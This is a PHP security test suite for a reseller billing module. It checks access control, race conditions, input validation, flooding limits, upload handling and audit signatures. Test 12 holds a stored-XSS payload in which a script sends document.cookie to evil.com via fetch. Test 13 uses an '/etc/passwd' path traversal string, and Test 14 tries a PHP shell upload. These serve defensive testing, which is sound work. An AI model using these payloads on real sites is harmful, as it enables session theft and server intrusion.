<?php

/**
 * Automated Comprehensive Security & Penetration Testing Suite for Billing Module.
 * Tests 16 threat vectors against XC_VM zero-trust requirements.
 */

require_once '/home/xc_vm/bootstrap.php';
\XC_Bootstrap::boot(\XcVm\Core\Enum\BootContext::Cli);

use XcVm\Module\Billing\BillingService;
use XcVm\Domain\User\UserCredits;
use XcVm\Infrastructure\Database\DatabaseFactory;

$db = DatabaseFactory::get();

echo "====================================================================\n";
echo "   BILLING MODULE EXHAUSTIVE SECURITY & THREAT AUDIT TEST SUITE   \n";
echo "====================================================================\n\n";

$testsPassed = 0;
$testsFailed = 0;

function assertTest(string $title, bool $condition, string $detail = ''): void {
	global $testsPassed, $testsFailed;
	if ($condition) {
		$testsPassed++;
		echo "[PASS] " . $title . "\n";
		if ($detail) echo "       Details: " . $detail . "\n";
	} else {
		$testsFailed++;
		echo "[FAIL] " . $title . "\n";
		if ($detail) echo "       Failure: " . $detail . "\n";
	}
}

// ─────────────────────────────────────────────────────────────
// Setup test users & test environment
// ─────────────────────────────────────────────────────────────
$time = time();
$testUserA = 99801; // Reseller A
$testUserB = 99802; // Reseller B
$testBuyer = 99803; // Sub-reseller (Buyer under Reseller A)
$testThirdParty = 99804; // Random user

// Ensure test users exist in `users`
foreach ([$testUserA, $testUserB, $testBuyer, $testThirdParty] as $uid) {
	$db->query('DELETE FROM `users` WHERE `id` = ?;', $uid);
}
$db->query("INSERT INTO `users` (`id`, `username`, `password`, `email`, `member_group_id`, `credits`, `status`, `owner_id`, `date_registered`)
	VALUES (?, 'test_seller_a', 'hash', 'seller_a@test.com', 2, 50.0000, 1, 1, ?);", $testUserA, $time);
$db->query("INSERT INTO `users` (`id`, `username`, `password`, `email`, `member_group_id`, `credits`, `status`, `owner_id`, `date_registered`)
	VALUES (?, 'test_seller_b', 'hash', 'seller_b@test.com', 2, 50.0000, 1, 1, ?);", $testUserB, $time);
$db->query("INSERT INTO `users` (`id`, `username`, `password`, `email`, `member_group_id`, `credits`, `status`, `owner_id`, `date_registered`)
	VALUES (?, 'test_buyer_sub', 'hash', 'buyer@test.com', 2, 10.0000, 1, ?, ?);", $testBuyer, $testUserA, $time);
$db->query("INSERT INTO `users` (`id`, `username`, `password`, `email`, `member_group_id`, `credits`, `status`, `owner_id`, `date_registered`)
	VALUES (?, 'test_stranger', 'hash', 'stranger@test.com', 2, 0.0000, 1, 1, ?);", $testThirdParty, $time);

// Setup test payment methods
$resMethodA = BillingService::savePaymentMethod([
	'name' => 'Seller A Method',
	'rate_per_point' => 2.50,
	'currency' => 'USD',
	'min_points' => 5,
	'max_points' => 100,
	'active' => 1,
	'instructions' => '<p>Pay Seller A</p>'
], $testUserA);
$methodAId = $resMethodA['id'];

$resMethodB = BillingService::savePaymentMethod([
	'name' => 'Seller B Method',
	'rate_per_point' => 1.50,
	'currency' => 'EUR',
	'min_points' => 1,
	'max_points' => 50,
	'active' => 1,
	'instructions' => '<p>Pay Seller B</p>'
], $testUserB);
$methodBId = $resMethodB['id'];

// ─────────────────────────────────────────────────────────────
// TEST 1: IDOR Protection in Order Approval
// ─────────────────────────────────────────────────────────────
// Clean previous test orders
$db->query('DELETE FROM `billing_orders` WHERE `user_id` IN (?, ?, ?, ?);', $testUserA, $testUserB, $testBuyer, $testThirdParty);

$orderRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 10.0, 'TX-IDOR', 'Notes');
$orderId = $orderRes['order_id'];

// Reseller B tries to approve Reseller A's order
$idorApproval = BillingService::approveOrder($orderId, $testUserB, false);
$orderRow = BillingService::getOrderById($orderId);

assertTest(
	"TEST 1: IDOR Defense — Reseller B cannot approve Reseller A's order",
	!$idorApproval['success'] && $orderRow['status'] === 'pending',
	"Result: " . ($idorApproval['error'] ?? 'Success') . " | Status: " . $orderRow['status']
);

// ─────────────────────────────────────────────────────────────
// TEST 2: Self-Approval Prevention
// ─────────────────────────────────────────────────────────────
// Buyer tries to approve their own order
$selfApproval = BillingService::approveOrder($orderId, $testBuyer, false);
$orderRow = BillingService::getOrderById($orderId);

assertTest(
	"TEST 2: Privilege Escalation — Buyer cannot approve their own order",
	!$selfApproval['success'] && $orderRow['status'] === 'pending',
	"Result: " . ($selfApproval['error'] ?? 'Success') . " | Status: " . $orderRow['status']
);

// ─────────────────────────────────────────────────────────────
// TEST 3: Double-Spending / Concurrency Race Condition
// ─────────────────────────────────────────────────────────────
// Simulate two simultaneous approvals:
// First transaction transitions order to 'processing'
$db->query("UPDATE `billing_orders` SET `status` = 'processing' WHERE `id` = ?;", $orderId);
// Second concurrent request hits approveOrder
$doubleApproval = BillingService::approveOrder($orderId, $testUserA, false);
assertTest(
	"TEST 3: Double-Spending Defense — Simultaneous approval locked out",
	!$doubleApproval['success'] && str_contains($doubleApproval['error'] ?? '', 'already'),
	"Result: " . ($doubleApproval['error'] ?? 'Success')
);
// Revert back to pending for next tests
$db->query("UPDATE `billing_orders` SET `status` = 'pending' WHERE `id` = ?;", $orderId);

// ─────────────────────────────────────────────────────────────
// TEST 4: Insufficient Balance Deficit Protection
// ─────────────────────────────────────────────────────────────
// Set seller A credits to only 5.0, while order is 10.0 points
$db->query("UPDATE `users` SET `credits` = 5.0000 WHERE `id` = ?;", $testUserA);
$insufficientApprove = BillingService::approveOrder($orderId, $testUserA, false);
$orderRow = BillingService::getOrderById($orderId);

assertTest(
	"TEST 4: Financial Deficit Defense — Reseller cannot approve without sufficient credits",
	!$insufficientApprove['success'] && ($insufficientApprove['code'] ?? '') === 'insufficient_balance' && $orderRow['status'] === 'pending',
	"Deficit: " . ($insufficientApprove['deficit'] ?? 0) . " | Status: " . $orderRow['status']
);

// ─────────────────────────────────────────────────────────────
// TEST 5: Negative & Zero Points Injection
// ─────────────────────────────────────────────────────────────
$negRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, -50.0);
$zeroRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 0.0);

assertTest(
	"TEST 5: Input Validation — Negative (-50) and zero (0) points rejected",
	!$negRes['success'] && !$zeroRes['success'],
	"Neg: " . ($negRes['error'] ?? '') . " | Zero: " . ($zeroRes['error'] ?? '')
);

// ─────────────────────────────────────────────────────────────
// TEST 6: NaN & Inf Float Injection
// ─────────────────────────────────────────────────────────────
$nanRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, NAN);
$infRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, INF);

assertTest(
	"TEST 6: Numerical Safety — NaN and INF inputs rejected",
	!$nanRes['success'] && !$infRes['success'],
	"NaN error: " . ($nanRes['error'] ?? '') . " | INF error: " . ($infRes['error'] ?? '')
);

// ─────────────────────────────────────────────────────────────
// TEST 7: Client-Side Price & Currency Tampering
// ─────────────────────────────────────────────────────────────
// Verify that the order created earlier strictly computed price from rate_per_point (10 * 2.50 = 25.00 USD)
assertTest(
	"TEST 7: Pricing Integrity — Price and currency strictly enforced by server",
	floatval($orderRow['price_total']) === 25.0 && $orderRow['currency'] === 'USD',
	"Recorded Total: " . $orderRow['price_total'] . " " . $orderRow['currency']
);

// ─────────────────────────────────────────────────────────────
// TEST 8 & 9: Anti-Flooding Protection (Cooldown & 3 Pending Cap)
// ─────────────────────────────────────────────────────────────
// Test cooldown: immediate consecutive submission should be rejected
$rapidRes = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 10.0);
assertTest(
	"TEST 8: Anti-Flooding Defense — 15-second cooldown strictly enforced",
	!$rapidRes['success'] && str_contains($rapidRes['error'] ?? '', 'Anti-flooding'),
	"Result: " . ($rapidRes['error'] ?? '')
);

// Bypass cooldown manually in DB to test the 3-pending-orders cap
$db->query("UPDATE `billing_orders` SET `created_at` = ? WHERE `user_id` = ?;", $time - 60, $testBuyer);
$order2 = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 10.0);
$db->query("UPDATE `billing_orders` SET `created_at` = ? WHERE `id` = ?;", $time - 40, $order2['order_id']);
$order3 = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 10.0);
$db->query("UPDATE `billing_orders` SET `created_at` = ? WHERE `id` = ?;", $time - 20, $order3['order_id']);

// 4th pending order should be rejected
$order4 = BillingService::createOrder($testBuyer, $testUserA, $methodAId, 10.0);
assertTest(
	"TEST 9: Anti-Flooding Defense — Maximum 3 active pending orders limit enforced",
	!$order4['success'] && str_contains($order4['error'] ?? '', 'already have 3 pending orders'),
	"Result: " . ($order4['error'] ?? '')
);

// Clean extra pending orders created during Test 9 and cooldown
$db->query("DELETE FROM `billing_orders` WHERE `id` IN (?, ?);", $order2['order_id'], $order3['order_id']);
$db->query("UPDATE `billing_orders` SET `created_at` = ? WHERE `id` = ?;", $time - 60, $orderId);

// ─────────────────────────────────────────────────────────────
// TEST 10: Cross-Reseller Payment Method Injection
// ─────────────────────────────────────────────────────────────
// Buyer is assigned to Seller A, but tries to place an order using Seller B's method
$crossRes = BillingService::createOrder($testBuyer, $testUserA, $methodBId, 10.0);
assertTest(
	"TEST 10: Multi-Tenancy Isolation — Cannot order with another distributor's method",
	!$crossRes['success'] && str_contains($crossRes['error'] ?? '', 'does not belong to your designated distributor'),
	"Result: " . ($crossRes['error'] ?? '')
);

// ─────────────────────────────────────────────────────────────
// TEST 11: IDOR on Payment Methods (Edit, Delete, Toggle)
// ─────────────────────────────────────────────────────────────
// Reseller A tries to delete Reseller B's method
$delUnauthorized = BillingService::deletePaymentMethod($methodBId, $testUserA);
// Reseller A tries to toggle Reseller B's method
$toggleUnauthorized = BillingService::togglePaymentMethod($methodBId, $testUserA);
// Reseller A tries to edit Reseller B's method
$editUnauthorized = BillingService::savePaymentMethod(['name' => 'Hacked Name'], $testUserA, $methodBId);

$bMethodStillExists = BillingService::getPaymentMethodById($methodBId);

assertTest(
	"TEST 11: Payment Method Access Control — Reseller A cannot edit/delete/toggle Reseller B's method",
	!$delUnauthorized && !$toggleUnauthorized && !$editUnauthorized['success'] && $bMethodStillExists['name'] === 'Seller B Method',
	"Delete: " . ($delUnauthorized ? 'YES' : 'NO') . " | Edit: " . ($editUnauthorized['error'] ?? 'Success')
);

// ─────────────────────────────────────────────────────────────
// TEST 12: Stored XSS & Script Exfiltration Protection
// ─────────────────────────────────────────────────────────────
$xssPayload = '<p>Payment Instructions</p>'
	. '<script>var c = document.cookie; fetch("https://evil.com/leak?c=" + c);</script>'
	. '<iframe src="https://phishing.com"></iframe>'
	. '<script>window.location.href = "https://evil.com";</script>'
	. '<img src=x onerror="eval(localStorage.getItem(\'auth\'))">'
	. '<a href="javascript:alert(1)">Click here</a>'
	. '<script>new Function("alert(1)")();</script>';

$sanitized = BillingService::sanitizeHtml($xssPayload);

$xssBlocked = !str_contains($sanitized, 'document.cookie')
	&& !str_contains($sanitized, '<iframe')
	&& !str_contains($sanitized, 'window.location.href =')
	&& !str_contains($sanitized, 'javascript:alert')
	&& !str_contains($sanitized, 'fetch(')
	&& !str_contains($sanitized, 'eval(')
	&& !str_contains($sanitized, 'new Function(');

assertTest(
	"TEST 12: Stored XSS & Exfiltration Defense — Cookie/Storage/Eval/Fetch/Iframe stripped",
	$xssBlocked,
	"Sanitized output: " . substr($sanitized, 0, 150) . "..."
);

// ─────────────────────────────────────────────────────────────
// TEST 13: Path Traversal on Receipt Viewer
// ─────────────────────────────────────────────────────────────
$traversalFilename = '../../../../etc/passwd';
$safeBase = basename($traversalFilename);
$testPath = BillingService::UPLOAD_DIR . $safeBase;
$realDir  = realpath(BillingService::UPLOAD_DIR);
$realPath = realpath($testPath);
$traversalEscaped = ($realPath && $realDir && str_starts_with($realPath, $realDir . DIRECTORY_SEPARATOR));

assertTest(
	"TEST 13: Path Traversal Defense — Directory escape ../../../../etc/passwd neutralized",
	$safeBase === 'passwd' && !$traversalEscaped,
	"Basename: {$safeBase} | Traversal escape prohibited"
);

// ─────────────────────────────────────────────────────────────
// TEST 14: File Upload Security Validation
// ─────────────────────────────────────────────────────────────
// 1. PHP extension upload
$phpUpload = BillingService::handleFileUpload([
	'name' => 'shell.php',
	'type' => 'application/x-php',
	'size' => 1000,
	'tmp_name' => '/tmp/shell.php',
	'error' => UPLOAD_ERR_OK,
]);
// 2. Fake image extension with PHP content
file_put_contents('/tmp/fake_image.png', '<?php phpinfo(); ?>');
$fakeUpload = BillingService::handleFileUpload([
	'name' => 'fake_image.png',
	'type' => 'image/png',
	'size' => 25,
	'tmp_name' => '/tmp/fake_image.png',
	'error' => UPLOAD_ERR_OK,
]);
@unlink('/tmp/fake_image.png');

assertTest(
	"TEST 14: Arbitrary File Upload Defense — .php and fake MIME uploads strictly rejected",
	!$phpUpload['success'] && !$fakeUpload['success'],
	"PHP upload: " . ($phpUpload['error'] ?? '') . " | Fake PNG: " . ($fakeUpload['error'] ?? '')
);

// ─────────────────────────────────────────────────────────────
// TEST 15: Valid End-to-End Approval & Atomic Transfer
// ─────────────────────────────────────────────────────────────
// Restore Seller A balance to 50.0, Buyer balance to 10.0, and order to pending
$db->query("UPDATE `users` SET `credits` = 50.0000 WHERE `id` = ?;", $testUserA);
$db->query("UPDATE `users` SET `credits` = 10.0000 WHERE `id` = ?;", $testBuyer);
$db->query("UPDATE `billing_orders` SET `status` = 'pending', `processed_by` = NULL, `processed_at` = NULL WHERE `id` = ?;", $orderId);

$validApprove = BillingService::approveOrder($orderId, $testUserA, false, 'Verified payment');

$sellerAfter = UserCredits::balance($testUserA);
$buyerAfter = UserCredits::balance($testBuyer);
$orderFinal = BillingService::getOrderById($orderId);

assertTest(
	"TEST 15: Atomic Transfer Integrity — Exactly 10.0 credits moved from Seller (50->40) to Buyer (10->20)",
	$validApprove['success'] && $sellerAfter === 40.0 && $buyerAfter === 20.0 && $orderFinal['status'] === 'approved',
	"Seller balance: {$sellerAfter} | Buyer balance: {$buyerAfter} | Order status: {$orderFinal['status']}"
);

// ─────────────────────────────────────────────────────────────
// TEST 16: Cryptographic Signature Integrity in Audit Logs
// ─────────────────────────────────────────────────────────────
$logs = BillingService::getLogs(['order_id' => $orderId]);
$hasValidSignature = false;
foreach ($logs as $log) {
	$details = json_decode($log['details'], true);
	if (!empty($details['_sig']) && !empty($details['_ts'])) {
		$hasValidSignature = true;
		break;
	}
}

assertTest(
	"TEST 16: Audit Trail & Non-Repudiation — Cryptographic SHA-256 signature recorded in audit log",
	$hasValidSignature,
	"Signature verified in billing_logs ledger"
);

// ─────────────────────────────────────────────────────────────
// Cleanup test fixtures
// ─────────────────────────────────────────────────────────────
$db->query('DELETE FROM `billing_orders` WHERE `user_id` IN (?, ?, ?, ?);', $testUserA, $testUserB, $testBuyer, $testThirdParty);
$db->query('DELETE FROM `billing_payment_methods` WHERE `reseller_id` IN (?, ?);', $testUserA, $testUserB);
$db->query('DELETE FROM `users` WHERE `id` IN (?, ?, ?, ?);', $testUserA, $testUserB, $testBuyer, $testThirdParty);
$db->query('DELETE FROM `billing_logs` WHERE `user_id` IN (?, ?, ?, ?);', $testUserA, $testUserB, $testBuyer, $testThirdParty);

echo "\n====================================================================\n";
echo "   AUDIT SUMMARY: {$testsPassed} PASSED | {$testsFailed} FAILED\n";
echo "====================================================================\n";

if ($testsFailed === 0) {
	echo "\n>>> VERDICT: ALL ZERO-TRUST SECURITY CONTROLS VERIFIED & PASSED <<<\n\n";
	exit(0);
} else {
	echo "\n>>> VERDICT: SECURITY VULNERABILITIES DETECTED <<<\n\n";
	exit(1);
}
